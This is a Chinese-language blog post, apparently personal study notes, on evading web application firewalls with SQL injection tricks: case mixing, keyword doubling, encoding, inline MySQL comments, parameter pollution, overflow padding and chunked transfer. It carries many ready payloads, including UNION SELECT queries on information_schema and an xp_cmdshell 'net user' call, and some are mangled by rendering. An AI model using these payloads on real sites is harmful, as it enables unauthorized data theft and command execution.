<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="绕过waf技巧常见的过WAF技巧1．大小写绕过∶·大小写绕过用于只针对小写或大写的关键字匹配技术·出现原因:在waf里，使用的正则不完善或者是没有用大小写转换函数·用法:比如，拦截了union，那就使用uNIoNXXx.com&#x2F;index.php?id&#x3D;-3 uNIoN sELect 1,2,3·注意:对于一些不太成熟的WAF效果显著 2．替换关键字∶关键字双写·出现原因∶利用waf的不完整性，只">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2022/04/20/%E7%BB%95%E8%BF%87waf%E6%8A%80%E5%B7%A7/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="绕过waf技巧常见的过WAF技巧1．大小写绕过∶·大小写绕过用于只针对小写或大写的关键字匹配技术·出现原因:在waf里，使用的正则不完善或者是没有用大小写转换函数·用法:比如，拦截了union，那就使用uNIoNXXx.com&#x2F;index.php?id&#x3D;-3 uNIoN sELect 1,2,3·注意:对于一些不太成熟的WAF效果显著 2．替换关键字∶关键字双写·出现原因∶利用waf的不完整性，只">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-04-20T08:56:40.041Z">
<meta property="article:modified_time" content="2022-04-20T08:57:51.907Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-绕过waf技巧" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/04/20/%E7%BB%95%E8%BF%87waf%E6%8A%80%E5%B7%A7/" class="article-date">
  <time datetime="2022-04-20T08:56:40.041Z" itemprop="datePublished">2022-04-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="绕过waf技巧"><a href="#绕过waf技巧" class="headerlink" title="绕过waf技巧"></a>绕过waf技巧</h1><h2 id="常见的过WAF技巧"><a href="#常见的过WAF技巧" class="headerlink" title="常见的过WAF技巧"></a>常见的过WAF技巧</h2><h3 id="1．大小写绕过∶"><a href="#1．大小写绕过∶" class="headerlink" title="1．大小写绕过∶"></a>1．大小写绕过∶</h3><p>·大小写绕过用于只针对小写或大写的关键字匹配技术<br>·出现原因:在waf里，使用的正则不完善或者是没有用大小写转换函数·用法:比如，拦截了union，那就使用uNIoN<br>XXx.com/index.php?id=-3 uNIoN sELect 1,2,3<br>·注意:对于一些不太成熟的WAF效果显著</p>
<h3 id="2．替换关键字∶"><a href="#2．替换关键字∶" class="headerlink" title="2．替换关键字∶"></a>2．替换关键字∶</h3><h4 id="关键字双写"><a href="#关键字双写" class="headerlink" title="关键字双写"></a>关键字双写</h4><p>·出现原因∶利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。·用法∶<br>XXX.Com/index.php?id=-3 UNION SELECT 1,2,3<br>·注意:有些时候甚至构造更复杂，如:SeLSeselectleCTecL</p>
<span id="more"></span>

<h4 id="同价词替换"><a href="#同价词替换" class="headerlink" title="同价词替换"></a>同价词替换</h4><p>·出现原因:WAF主要是针对一些特殊的关键词进行检测<br>·用法︰<br>    and和or不能使用:&amp;&amp;和Ⅱ 代替and和or<br>    =不能使用的情况:可以尝试&lt;、&gt;代替<br>    ·空格不能使用（常见）︰%20 %09 %0a %0b %Oc %Od %a0/**/ 代替空格<br>·注意:在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗</p>
<h4 id="特殊字符拼接"><a href="#特殊字符拼接" class="headerlink" title="特殊字符拼接"></a>特殊字符拼接</h4><p>·出现原因:把特殊字符拼接起来绕过WAF的检测<br>·用法︰如在函数里可以用+来拼接，在Mysql中可以利用注释/**/绕过<br>    xxx.com/index.php?id=1;exec(master..xp_cmdshell ‘net user’)<br>特殊字符拼接<br>     xxx.com/index.php? id=1; exec(‘maste’+’r..xp’+’_cmdshell’+’”net user”‘)</p>
<h3 id="3-编码绕过"><a href="#3-编码绕过" class="headerlink" title="3.编码绕过:"></a>3.编码绕过:</h3><p>·对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、 base64等URL编码·出现原因:利用浏览器上的进制转换或者语言编码规则来绕过waf<br>URL编码<br>·输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28等·注意:如果URL编码只进行了一次过滤，可以用两次编码绕过<br>·用法∶<br>index.php?id=1/<strong>/UNION/</strong>/SELECT 1,2,3</p>
<h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><p>index.php?id=1%2f%2a%2a%2f%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74%20%31%2c%32%2c%33%0a</p>
<h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4><p>·常用符号的Unicode编码︰<br>单引号: %u0027空格:%u0020左括号:%u0028右括号:%u0029<br>用法︰<br>index.php?id=1 union select 1,2,3<br>Unicode编码<br>index.php?id=1 un%u0069on sel%u0065ct 1,2,3</p>
<h3 id="4-注释绕过"><a href="#4-注释绕过" class="headerlink" title="4.注释绕过:"></a>4.注释绕过:</h3><p>·常见的用于注释的符号∶//、–、/<strong>/、#、-–+、– -、 ;、-–a</strong></p>
<p>出现原因∶利用语言函数特性来绕过waf的规则</p>
<h4 id="普通注释"><a href="#普通注释" class="headerlink" title="普通注释"></a>普通注释</h4><p>/<strong>/在构造的查询语句中插入注释，规避对空格的依赖或关键字识别。</strong></p>
<p>用法︰<br>index.php?id=1 UNION SELECT 1,2,3<br>普通注释<br>index.php?id=1/<strong>/UNION/</strong>/SELECT 1,2,3</p>
<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p>相比普通注释，内联注释用的更多，它有一个特性/!<em><em>/只有MySQL能识别(/</em>!<em>/表示注释里面的语句会被执行)<br>用法∶采用/</em>! code <em>/来执行我们的SQL语句，内联注释可以用于整个SQL语句中<br>举例:过滤器过滤了如下内容union,where, table name, table schema, =, and information schema，这些都是我们内联绕过需要绕过的目标<br>id=1 union select 1,2,concat(table name) from information schema.tables where table schema =database()<br>内联注释<br>id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM/*!information schema</em>/.tables /<em>!WHERE</em>/+/*!TaBIE..ScHeMa</em>/+like+database()<br>·注意︰/<em>!50001 select * from test</em>/的含义︰表示假如数据库是5.00.01以上版本，该语句才会被执行</p>
<h3 id="5参数污染"><a href="#5参数污染" class="headerlink" title="5参数污染:"></a>5参数污染:</h3><p>HPP(HTTP Parameter Polution)又称做重复参数污染 ，当同一参数出现多次 ，不同中间件会解析为不同的结果</p>
<p>如果WAF只检测了同参数名中的第一个或最后一 个，并且中间件特性正好取与WAF相反的参数，则可成功绕过。</p>
<table>
<thead>
<tr>
<th align="center">服务器中间件</th>
<th align="center">解析结果</th>
<th align="center">举例说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ASP.NETIIS</td>
<td align="center">所有出现的参数值用逗号连接</td>
<td align="center">par1=val1,val2</td>
</tr>
<tr>
<td align="center">ASP/IS</td>
<td align="center">所有出现的参数值用逗号连接</td>
<td align="center">par1=val1,val2</td>
</tr>
<tr>
<td align="center">PHP/Apache</td>
<td align="center">仅最后一次出现参数值</td>
<td align="center">par1=val2</td>
</tr>
<tr>
<td align="center">JSP/Tomcat</td>
<td align="center">仅最后一次出现参数值</td>
<td align="center">par1=val1</td>
</tr>
<tr>
<td align="center">Perl CGI/Apache</td>
<td align="center">仅第一次出现参数值</td>
<td align="center">par1=val1</td>
</tr>
</tbody></table>
<p>案例:<br>ModSecurity过滤器会将类似于select1,2,3 from table这类的语句归类为黑名单<br>当web服务器遇到类似/index.aspx?id=select 1,2,3 from table这样的语句时，会阻断请求<br>但是这个web服务器在遇到为同一个参数赋值不同数值时，会将它们连接起来，攻击者通过这个方法来绕过黑名单<br>例如︰<br>想要执行的语句:/index.aspx?id=select 1,2,3 from table<br>参数污染<br>提交的URL : /index.aspx?id=select 1&amp;id=,2,3 from table<br>说明∶1、这不属于黑名单中的模式，不会触发黑名单的拦截功能<br>            2、由于WEB程序会采取连接操作，即将&amp;符号前后的内容个连接，因此SQL注入行为能够被执行</p>
<h3 id="6-缓冲区溢出∶"><a href="#6-缓冲区溢出∶" class="headerlink" title="6.缓冲区溢出∶"></a>6.缓冲区溢出∶</h3><p>缓冲区溢出用于绕过WAF，许多WAF是C语言写的，而C语言自身没有缓冲区保护机制</p>
<p>因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
<p>例如︰<br>?id=1 and (select 1)=(Select 0xAAAAAAAAA<em>1000 more A)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user),8,9,10–+<br>说明︰示例OxA</em>1000指OxA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。</p>
<h3 id="7整合绕过"><a href="#7整合绕过" class="headerlink" title="7整合绕过:"></a>7整合绕过:</h3><p>整合的意思是结合使用前面的各种绕过技术，单一的技术可能无法绕过过滤机制，但多种技术的配合使用成功的可能性会增加<br>多种技术的使用增加了更多的可能性，除非每一种技术单独都无法使用，否则它们能大大增加绕过的成功性</p>
<p>例如︰<br>id=1/<em>IUnIoN</em>/+SeLeCT+1,2,concat(/<em>!table_name</em>/)+FrOM<br>/<em>!information_schema</em>/.tables /<em>!WHERE</em>/+/<em>!TaBIE_ScHeMa</em>/+ like+database()</p>
<p>?id=1+/<em>!UNION</em>/+/<em>!SELECT</em>/+1,GrOup_COnCaT(COLUMN_NAME),3,4-5+FROM+/<em>!INFORMATION_SCHEM</em>/.COLUMNS+WHERE+TABLE_NAME=Ox41646d696e–</p>
<h3 id="8-分块传输绕过"><a href="#8-分块传输绕过" class="headerlink" title="8.分块传输绕过:"></a>8.分块传输绕过:</h3><p>·举例∶</p>
<p>正常使用id=1 and 1=2,被安全狗拦住</p>
<p>使用分块传输，将id=1 and 1=2进行分块，成功绕过了安全狗</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Econding:chunked  //代表是分块传输</span><br><span class="line">5</span><br><span class="line">id=1   //第一块长度为5，内容为id=1 </span><br><span class="line">2</span><br><span class="line">an     //第二块长度为2，内容为an</span><br><span class="line">3</span><br><span class="line">d 1    //第三块长度为3，内容为d 1</span><br><span class="line">2</span><br><span class="line">=2     //第四块长度为2，内容为=2</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">       //最后一块长度为0，内容为空 注意0下面必须有两个空行</span><br></pre></td></tr></table></figure>

<p>注意︰分块传输需要将关键字and,or,select ,union等关键字拆开，不然仍然会被waf拦截。编码过程中长度需包括空格的长度。最后用0表示结束，并在0后空两行表示数据包结束</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/04/20/%E7%BB%95%E8%BF%87waf%E6%8A%80%E5%B7%A7/" data-id="cl27devjg0001n0u208hdhlnl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/04/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/04/20/SQLMAP/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/04/22/xss-labs/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/04/21/XSS%E6%BC%8F%E6%B4%9E/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/04/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/04/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">(no title)</a>
          </li>
        
          <li>
            <a href="/2022/04/20/%E7%BB%95%E8%BF%87waf%E6%8A%80%E5%B7%A7/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>